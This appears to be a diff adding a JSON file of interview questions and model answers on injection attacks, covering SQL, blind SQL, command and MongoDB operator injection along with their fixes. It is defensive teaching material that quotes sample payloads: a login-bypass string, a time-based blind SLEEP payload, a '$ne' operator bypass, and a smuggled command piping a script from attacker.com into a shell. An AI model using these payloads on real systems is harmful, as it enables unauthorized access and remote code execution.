@@ -1,0 +1,45 @@
+{
+  "topicId": "injection-attacks",
+  "interviewQuestions": [
+    {
+      "id": "injection-attacks-iq1",
+      "question": "How does SQL injection actually work, and how would you fix it properly?",
+      "answerMarkdown": "It works because the application builds a SQL string by concatenating a trusted template with untrusted input, and the database has no way to tell where the developer's SQL ends and the attacker's begins. A username of `' OR '1'='1` closes the developer's string literal early and appends a clause that's always true, so the query matches every row instead of one.\n\nThe fix isn't smarter escaping — it's parameterized queries: pass the SQL template and the input value to the driver as two separate arguments, so the database finalizes the template as SQL *before* the parameter is even considered, then substitutes it as a plain value with no further parsing. There's no string left for a quote to break out of.\n\nI'd also flag two things people often miss: ORMs aren't automatically safe, because almost every one exposes a raw-query escape hatch that's exactly as vulnerable if you build it with string interpolation. And least-privilege database accounts are worth having anyway — if injection does slip through somewhere, an app account that can't `DROP TABLE` or touch other schemas limits how bad it gets.\n\n**Testing:** whether you can explain the actual mechanism, not just recite \"use prepared statements.\"",
+      "mostAsked": true,
+      "level": "beginner",
+      "subTitle": "Fundamentals"
+    },
+    {
+      "id": "injection-attacks-iq2",
+      "question": "An application looks immune to SQL injection because error messages and page content never change based on the query. Is it actually safe?",
+      "answerMarkdown": "No — that's exactly the setup for blind SQL injection, and it's the harder, more realistic case in any app that's already had basic input handling reviewed once.\n\nWithout a visible signal, an attacker falls back to an indirect one. Boolean-based blind injection watches for *any* subtle behavioral difference between a true and false condition — a status code, a redirect, response size. Time-based blind injection is even more robust: inject `' AND IF(1=1, SLEEP(5), 0)` and read the condition's truth off the response latency. Repeat that one bit at a time — is the first character of the password hash 'a'? — and you can exfiltrate an entire table with zero visible output, just timing. Tools like sqlmap automate exactly this.\n\nSo \"the output never changes\" tells me the *visible* channel is safe, not that the query is unparameterized safely. I'd still check for string concatenation in the query-building code directly, and I'd add rate limiting and anomaly detection on request timing, since blind extraction needs thousands of requests and that volume is itself a detectable signal.\n\n**Testing:** whether you know injection can succeed with zero visible feedback, or assume \"nothing changes\" means \"nothing's wrong.\"",
+      "mostAsked": false,
+      "level": "intermediate",
+      "subTitle": "Detection"
+    },
+    {
+      "id": "injection-attacks-iq3",
+      "question": "Why is command injection often considered more dangerous than SQL injection, even though they're the same class of bug?",
+      "answerMarkdown": "Because the blast radius is different, not because the mechanism is. Both come from concatenating untrusted input into a string handed to an interpreter — SQL injection hands the database an attacker-controlled clause, command injection hands the **operating system shell** an attacker-controlled command.\n\nThat matters because a compromised database connection is still scoped to whatever that database account can do. A compromised shell is scoped to whatever the *server process* can do: read and write the file system, reach internal network services, install a persistent backdoor, pivot to other hosts. `os.system(\"ping -c 1 \" + host)` with a host of `example.com && curl attacker.com/shell.sh | sh` doesn't just corrupt data, it can hand over the box.\n\nThe fix has the same shape as SQL injection's fix: separate code from data structurally. Pass subprocess arguments as a list (`subprocess.run([\"ping\", \"-c\", \"1\", host])`) instead of a shell string, so there's no shell metacharacter for the interpreter to act on. I'd also flag that command injection often hides in \"safe-looking\" utility code — an image converter or PDF generator that shells out internally — not just obvious user-facing fields.\n\n**Testing:** whether you understand blast radius as the differentiator, since the root-cause mechanism is identical to SQL injection.",
+      "mostAsked": false,
+      "level": "intermediate",
+      "subTitle": "Impact"
+    },
+    {
+      "id": "injection-attacks-iq4",
+      "question": "Your app uses MongoDB, not SQL. Does that mean it's immune to injection?",
+      "answerMarkdown": "No — the specific `' OR '1'='1'` syntax doesn't apply, but the same structural mistake shows up as **operator injection**: sending a query operator where a plain value was expected.\n\nThe classic case is a login check like `db.users.findOne({ username, password })` where `password` is bound straight from the JSON request body. A normal login sends a string. An attacker sends `{\"password\": {\"$ne\": null}}` instead, and Mongo interprets `$ne` as \"not equal\" — the query becomes \"find a user whose password is not null,\" true for any account with a password set. No password required, no SQL keyword anywhere in the payload.\n\nThe generalization I'd give: any data store whose query language is embeddable inside the input format — operators inside JSON, directives inside GraphQL — has its own injection surface, independent of whether it's relational. The fix is structurally the same idea as parameterization: validate and coerce input into the expected *type* before it reaches the query (reject an object where a string was expected), rather than trusting the request body's shape.\n\n**Testing:** whether you generalize injection to \"code/data confusion in any interpreter,\" or only recognize the SQL-specific syntax.",
+      "mostAsked": false,
+      "level": "advanced",
+      "subTitle": "Beyond SQL"
+    },
+    {
+      "id": "injection-attacks-iq5",
+      "question": "You're reviewing a codebase and every direct SQL query is parameterized. What else would you check before signing off on injection risk?",
+      "answerMarkdown": "Parameterization on the obvious queries is necessary but not sufficient — I'd specifically go hunting for the places the pattern hides.\n\n- **ORM raw-query escape hatches.** Almost every ORM has a `.raw()` or equivalent for cases its abstraction doesn't cover, and that path is exactly as vulnerable as hand-written SQL if someone interpolates a string into it. I'd grep for it explicitly.\n- **Second-order injection.** Input that was safely parameterized going *in* can still be unsafely concatenated going *out* — a value read back from the database and used to build a new query or shell command later, without re-parameterizing. The safe write doesn't protect the unsafe read.\n- **Non-obvious channels.** A filename, an HTTP header that gets logged and later queried against, a CSV export that's re-imported — anywhere a string crosses from \"data I received\" to \"command I build,\" not just the fields a form obviously submits.\n- **Command and NoSQL surfaces**, since \"all SQL is parameterized\" says nothing about a shell call or a MongoDB query built from raw JSON elsewhere in the same codebase.\n\nI'd also check for least-privilege database accounts as a backstop, since no review catches everything — limiting what a successful injection could actually do is real defense-in-depth.\n\n**Testing:** whether you think about injection as a pattern to hunt across the whole system, or stop once the obvious queries look clean.",
+      "mostAsked": false,
+      "level": "advanced",
+      "subTitle": "Code review"
+    }
+  ]
+}
